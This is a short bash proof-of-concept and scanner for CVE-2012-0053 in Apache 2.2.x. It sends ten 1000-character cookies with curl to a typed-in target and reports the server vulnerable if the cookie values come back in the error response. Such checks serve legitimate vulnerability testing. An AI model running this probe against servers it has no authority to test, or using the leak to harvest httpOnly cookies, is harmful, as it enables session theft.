#!/bin/bash

# Affected: Apache HTTP Server 2.2.x through 2.2.21
# CVE-ID: CVE-2012-0053
# Author: styx00

start=`date +%s`

# Disable curl output for now
output=false

# Colours <3
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD=$(tput bold)
RESET=$(tput sgr0)

# Function to show the script's usage
function usage
{
    printf "usage: ./apacheCookieLeakage.sh [[-s] | [-h]]\n\n"
    printf "Optional Arguments:\n\t-s, --show\tShow curl output for manual investigation\n"
    printf "\t-h, --help\tShow help and exit\n"
}

# Loop through the provided arguments
while [ "$1" != "" ]; do
    case $1 in
        -s | --show )           output=true
                                ;;
        -h | --help )           usage
                                exit
                                ;;
        * )                     usage
                                exit 1
    esac
    shift
done

# Prompt for user input
printf "Type the target followed by [ENTER]: "
read target # Get the users input


# To exploit this vulnerability we need to provide long cookie values so generate 1000 characters
cookieValue=$(for i in {1..1000}; do printf x; done)
cookie=""


# Generate a string which contains 10 cookies with the cookie value generated above
for i in {1..10};
do
	cookie="${cookie}TEST${i}=${cookieValue};"
done


# Check if the input starts with http:// or https:// and if protocol is not specified assume http://
if [[ ${target} != "http://"* ]] && [[ ${target} != "https://"* ]]
then
	printf "\nNo protocol was specified. Assuming http://%s\n" "${target}"
	target="http://${target}"
fi


# Store the response of the curl command so we can check if the cookies sent are reflected in the response
response=$(curl -ski --connect-timeout 10 ${target} -H "Cookie: ${cookie}")


# If the user provided the -s argument, print the curl output
if [[ ${output} == true ]]
then
    printf "\n%s\n" "${response}"
fi


# If the cookies sent are reflected in the response, the target is vulnerable
if [[ ${response} == *"TEST"*"="* ]]
then
    printf "\nThe server is ${RED}${BOLD}vulnerable${RESET}.\n"
else
    printf "\nThe server is ${GREEN}${BOLD}NOT vulnerable${RESET}.\n"
fi


# Calculate and print script's running time
end=`date +%s`
runtime=$((end-start))

# Print the script's running time
printf "\nFinished in %s seconds.\n" ${runtime}
